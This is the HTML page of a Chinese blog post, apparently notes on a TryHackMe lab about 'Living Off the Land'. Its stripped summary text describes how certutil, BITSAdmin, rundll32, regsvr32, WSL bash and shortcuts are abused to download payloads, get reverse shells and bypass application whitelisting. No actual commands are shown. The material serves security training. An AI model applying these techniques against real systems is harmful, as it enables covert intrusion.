<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-靠土地为生 | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-靠土地为生"><meta name="application-name" content="THM-靠土地为生"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-靠土地为生"><meta property="og:url" content="http://hybcx.xyz/2024/08/20/thm-kao-tu-di-wei-sheng/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="在红队活动中了解“靠土地为生”的基本概念。 0x01 介绍 什么是“靠土地为生”？ **“Living Off the Land”**是红队社区中的一个流行术语。这个名字取自现实生活，靠吃土地上现有的食物为生。同样，对手和恶意软件创建者也会利用目标计算机的内置工具和实用程序。 “ Living Of"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="在红队活动中了解“靠土地为生”的基本概念。 0x01 介绍 什么是“靠土地为生”？ **“Living Off the Land”**是红队社区中的一个流行术语。这个名字取自现实生活，靠吃土地上现有的食物为生。同样，对手和恶意软件创建者也会利用目标计算机的内置工具和实用程序。 “ Living Of"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/08/20/thm-kao-tu-di-wei-sheng/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-靠土地为生',
  postAI: '',
  pageFillDescription: '0x01 介绍, 什么是靠土地为生？, 学习目标, 房间先决条件, 0x02 Windows 系统内核, 什么是 Windows Sysinternals, Sysinternals Live, 红队的利用和好处, 0x03 LOLBAS 项目, 什么是LOLBAS, 工具标准, 有趣的功能, 0x04 文件操作, Certutil, BITSAdmin, FindStr, 0x05 文件执行, File Explorer, WMIC, Rundll32, 0x06 应用程序白名单绕过, 绕过应用程序白名单, Regsvr32, Bourne Again Shell (Bash), 0x07 其他技术, Shortcuts 快捷方式, No PowerShell!, 0x08 真实场景, 0x09 结论, 其他资源在红队活动中了解靠土地为生的基本概念介绍什么是靠土地为生是红队社区中的一个流行术语这个名字取自现实生活靠吃土地上现有的食物为生同样对手和恶意软件创建者也会利用目标计算机的内置工具和实用程序一词于年在上推出此后在红队社区中获得了更多关注成为一种经常使用和流行的技术这些内置工具在目标系统或网络功能内执行各种常规活动然而它们的使用和滥用越来越多例如使用工具将恶意文件下载到目标计算机中主要想法是使用签名的程序脚本和库来融入和逃避防御控制红队成员不希望在对目标执行交战活动时被发现因此使用这些工具可以更安全地保持隐秘性以下是靠土地生活的一些类别侦察文件操作任意代码执行横向运动安全产品绕过学习目标了解红队参与的一词了解项目以及如何使用它了解并应用红队活动中使用的技术房间先决条件一般黑客技术的基础知识完成初级渗透测试员学习路径红队初始访问模块我们提供了一台机器来完成这个房间您可以使用浏览器内功能或者如果您更喜欢通过连接请确保部署或连接到使用下面的以下凭据系统内核什么是是一组工具和高级系统实用程序旨在帮助专业人员在各种高级主题中管理排除故障和诊断操作系统分为多个类别包括磁盘管理进程管理网络工具系统信息安全工具为了使用工具我们需要接受这些工具的许可协议我们可以通过传递来做到这一点命令提示符处或工具执行期间通过提供的参数以下是一些流行的工具帮助系统管理员检查文件目录注册表项全局对象和服务的指定访问权限在远程系统上执行程序的工具高级工具有助于轻松查看和管理数据库监视运行进程的峰值以及转储内存以进行进一步分析的能力过程监控的重要工具列出所有和连接的工具套件中设计的第一个工具用于帮助列出详细信息监视并显示系统上的所有串行和并行端口活动提供指定域名或地址的信息有关套件的更多信息您可以在此处访问上的工具网页的一大特点是无需安装提供了服务提供了使用和执行该工具的各种方法我们可以通过以下方式访问和使用它们网络浏览器链接共享命令提示符要使用这些工具您可以下载它们也可以在资源管理器中输入路径请注意由于附加的虚拟机无法访问互联网因此我们在中预先下载了工具如果您有兴趣了解有关的更多信息我们建议您熟悉以下附加资源房间资源网站红队的利用和好处内置工具和工具对系统管理员很有帮助由于黑客恶意软件和渗透测试人员对操作系统具有固有的信任这些工具也被他们使用这种信任对于红队成员来说是有益的他们不希望被目标系统上的任何安全控制检测到或捕获因此这些工具已被用来逃避检测和其他蓝队控制请记住由于如今使用这些工具的对手和恶意软件创建者不断增加蓝队意识到了恶意使用情况并对其中大多数实施了防御控制项目什么是代表该项目的主要目标是收集和记录用作技术的签名和内置工具包括二进制文件脚本和库项目是一个社区驱动的存储库收集了可用于红队目的的二进制文件脚本库的集合它允许基于二进制文件函数脚本和信息进行搜索上图显示了此时项目页面的样子如果您有兴趣了解该项目的更多详细信息您可以访问该项目的网站网站提供了方便的搜索栏来查询所有可用数据查找二进制文件很简单包括二进制名称将显示结果但是如果我们想查找特定的函数则需要在函数名称之前提供例如如果我们要查找所有执行函数我们应该使用类似地为了根据类型查找我们应该使用符号后跟类型名称项目中包含的类型如下脚本二进制库其他二进制文件工具标准工具要成为靠土地生存技术并被接受为项目的一部分需要具体标准操作系统本机的签名文件或从下载的文件具有已知用例未涵盖的其他有趣的意外功能有利于高级持续威胁或红队参与请注意如果您发现符合前面提到的标准的令人兴奋的二进制文件您可以通过访问存储库贡献页面来提交您的发现以获取更多信息有趣的功能项目接受符合以下功能之一的工具提交任意代码执行文件操作包括下载上传复制文件编译代码持久性包括将数据隐藏在备用数据流中或在登录时执行绕过转储进程内存注入文件操作此任务显示基于现实世界以及红队活动中看到的功能和恶意软件活动的常用工具此任务将重点介绍一些有趣的技术旨在用于文件操作包括下载上传和编码是一个用于处理认证服务的内置实用程序它用于转储和显示证书颁发机构配置信息和其他组件因此该工具的正常用途是检索证书信息然而人们发现可以传输和编码与认证服务无关的文件框架将此技术标识为工具传输为了通过示例来说明这一点我们可以使用使用以下命令从攻击者的服务器下载文件并将其存储在的临时文件夹中请注意我们使用和参数来强制该工具使用分割技术从提供的下载显示启用在命令中使用选项分割并强制从提供的获取文件此外还可以用作编码工具我们可以对文件进行编码并解码文件的内容引用了这种混淆文件的技术使其难以发现或分析有关该工具的更多信息您可以访问此处的文档工具是一个系统管理员实用程序可用于创建下载或上传后台智能传输服务作业并检查其进度是一种低带宽异步方法用于从服务器和服务器下载和上传文件有关工具的其他信息请参阅攻击者可能会滥用作业在受感染的计算机中下载并执行恶意负载有关此技术的更多信息您可以访问页面介绍终端容器内容重温使用传输选项我们指定使用下载类型进行传输我们正在将作业的优先级设置为在前台运行有关的更多信息参数您可以访问该工具的微软文档是内置工具用于查找文件中的文本和字符串模式工具非常有用可以帮助用户和系统管理员在文件或解析的输出中进行搜索例如如果我们想检查我们机器上的端口是否打开那么我们可以通过管道传输的结果来查找该端口如下所示但是使用发现了一种意想不到的方法从网络内的共享文件夹下载远程文件如下所示打印出不包含所提供字符串的行要搜索的文本在这种情况下我们提供了一个不能在文件中找到的字符串将输出重定向到目标计算机上的文件请注意可以使用其他工具进行文件操作我们建议参观项目来检查它们在下一个任务中我们将介绍一些用于执行文件的工具文件执行此任务展示了在操作系统中执行二进制文件的各种方法执行二进制文件的典型情况涉及各种已知的方法例如使用命令行或从桌面然而还存在通过滥用其他系统二进制文件来实现有效负载执行的其他方法其中原因之一是隐藏或强化有效负载的进程基于框架该技术称为签名二进制代理执行或间接命令执行攻击者利用其他系统工具生成恶意负载这种技术还有助于逃避防守控制文件资源管理器是的文件管理器和系统组件人们发现使用文件资源管理器二进制文件可以执行其他文件这种技术称为间接命令执行其中可以使用和滥用工具从受信任的父进程启动恶意脚本或可执行文件二进制文件位于位版本的位版本的为了创建的子进程父级我们可以执行以下命令作为上一个命令的结果我们在桌面上弹出了计算器是一个用于管理组件的命令行实用程序人们发现还被用来执行逃避防御措施的二进制文件框架将此技术称为签名二进制代理执行上述命令创建一个我们选择的二进制文件的新进程在本例中为是内置工具可在操作系统中加载和运行动态链接库文件红队可以滥用和利用来运行任意负载并执行和脚本框架将此识别为签名二进制代理执行并将其称为二进制文件位于位版本的位版本为现在让我们尝试执行使用的二进制文件作为概念证明二进制使用工具是的一个重要组件它是的核心组件之一用于处理和通过你可以运行一个应用程序该应用程序可以执行嵌入的脚本在这个例子中代码使用了的路径以便可以加载它进而调用函数是中的一个函数它会执行传递给它的字符串内容将其视为代码在这段代码中执行了以下代码创建一个的对象这个对象可以用来执行系统命令操作文件注册表等使用对象的方法来运行系统命令在这里它运行了即计算器程序关闭当前的窗口这里是关闭执行环境在前面的命令中我们使用了嵌入组件的二进制文件用于执行二进制微软计算器正如我们之前提到的我们还可以使用执行脚本以下命令运行该执行脚本以使用从远程网站下载作为先前执行的结果的副本下载到目标机器的内存中应用程序白名单绕过绕过应用程序白名单应用程序白名单是端点安全功能可防止恶意和未经授权的程序实时执行应用程序白名单是基于规则的它指定允许在操作系统上存在和执行的已批准应用程序或可执行文件的列表此任务重点关注用于绕过应用程序白名单的示例是一个命令行工具用于在注册表中注册和取消注册动态链接库二进制文件位于位版本的位版本的除了预期用途之外二进制文件还可用于执行任意二进制文件并绕过应用程序白名单根据报告二进制文件是第三大最流行的技术攻击者利用在本地或远程执行本机代码或脚本中使用的技术使用受信任的操作系统组件并在内存中执行这也是该技术也用于绕过应用程序白名单的原因之一让我们尝试在现实生活中应用这种技术首先我们需要创建一个恶意使用文件并设置监听器来接收反向请注意我们将创建一个适用于位操作系统的恶意文件我们将使用应用程序白名单绕过技术在目标系统上运行命令请注意我们将输出类型指定为使用参数一旦生成了恶意文件我们就需要将有效负载传递给受害者计算机我们将通过使用网络服务器在我们的攻击机器上提供文件来做到这一点如下所示从受害者机器上通过端口访问攻击机器的服务器我们指定的请注意此端口可以根据您的选择进行更改在受害计算机上下载文件文件后我们使用执行它如下使用第二个选项这是一个更高级的命令我们指示运行处于静默模式不显示消息不调用注册服务器使用另一台服务器因为我们使用了使用注销方法运行在攻击机器上我们应该收到一个反向注意如果我们想创建位版本我们需要在命令中指定它并使用位版本的从受害计算机运行它位于年微软在和上添加了对环境的支持此功能称为存在两个版本和是一个在操作系统上运行的虚拟化发行版支持内核和系统调用的子集此功能是一个插件用户可以安装该插件并与发行版交互作为的一部分是一个用于与环境交互的工具人们找到了执行有效负载并绕过应用程序白名单的方法因为它是签名的二进制文件通过执行我们可以执行任何未签名的有效负载将此称为间接命令执行技术攻击者滥用工具实用程序来获取命令执行有关此技术的更多信息您可以访问网站请注意您需要在中启用并安装才能使用此外由于嵌套虚拟化限制附加的未启用子系统请记住本节重点介绍了一些有趣的工具如果您有兴趣查看可用的工具您可以访问该项目网站其他技术本节重点介绍一些使用的有趣技术无论是初始访问还是持久性以下技术属于范畴因为它们可以用作环境实用程序的一部分快捷方式快捷方式或符号链接是一种用于引用操作系统内其他文件或应用程序的技术一旦用户单击快捷方式文件就会执行参考文件或应用程序通常红队利用此技术来获得初始访问权限权限升级或持久性框架将此快捷方式修改技术称为攻击者创建或修改快捷方式以利用此技术要使用快捷方式修改技术我们可以使用以下命令设置目标部分来执行文件附图显示了快捷方式修改技术的示例其中攻击者修改了目标部分以使用执行二进制文件我们选择执行计算器而不是运行应用程序一旦受害者点击快捷方式图标被执行有关快捷方式修改的更多信息您可以查看此存储库年发布了一份威胁检测报告指出是恶意活动最常用的技术因此组织开始监控或阻止以免被处决因此攻击者会找到其他方法来运行代码而不生成它是一个基于的工具可生成恶意代码在目标计算机上运行而不显示进程的实例依赖滥用一个用于构建应用程序的平台来执行远程代码首先让我们将项目的副本从存储库下载到上项目要求之一是获取有效负载以使其适合与一起使用在上我们需要使用生成有效负载如下另外我们需要运行框架来监听并等待反向现在我们已经准备好有效负载更改为目录项目以将有效负载转换为与工具兼容然后运行工具并将源文件设置为我们使用创建的文件如下所示命令执行成功后我们需要将输出文件传输到机器您可以使用来完成此操作或设置服务器以在上托管文件并使用浏览器下载文件最后在目标计算机上构建文件并等待反向运行命令后等待几秒钟直到收到反向请注意不会有进程正在运行真实场景此任务介绍了使用本会议室讨论的技术的恶意软件展示年高级威胁防护研究团队发现了名为的无文件恶意软件无文件恶意软件意味着恶意软件在系统中运行并执行而不写入磁盘恶意软件从受害设备的内存中执行其所有功能被称为信息窃取程序它从受害者用户那里获取敏感信息例如帐户凭据击键和其他数据并将其发送给攻击者该恶意软件依赖于各种先进技术例如反调试反虚拟化反仿真技巧进程空洞备用数据流和来执行不同的功能在初始访问阶段攻击者依赖包含恶意附件文件的垃圾邮件活动附件是一个文件快捷方式一旦受害者单击它将导致以下结果执行命令来下载并运行代码滥用从下载多个二进制文件有趣的是在某些情况下恶意软件会使用频道描述来隐藏其服务器命令使用技术将其二进制文件隐藏在系统中以实现持久性工具用于将几个下载的有效负载解码为文件文件使用执行有关恶意软件和检测的更多详细信息我们建议检查以下参考文献银行木马微软发现无文件恶意软件活动投放信息窃取程序恶意软件在频道描述中隐藏命令服务器结论在这个房间里我们介绍了靠土地生活的一般概念并回顾了红队活动期间看到和使用的一些例子技术可用于各种目的包括侦察文件操作执行二进制文件以及持久性和绕过安全措施其他资源项目的版本银行木马现实生活中的恶意软件分析他们展示了恶意软件使用的技术',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-20 22:48:49',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a 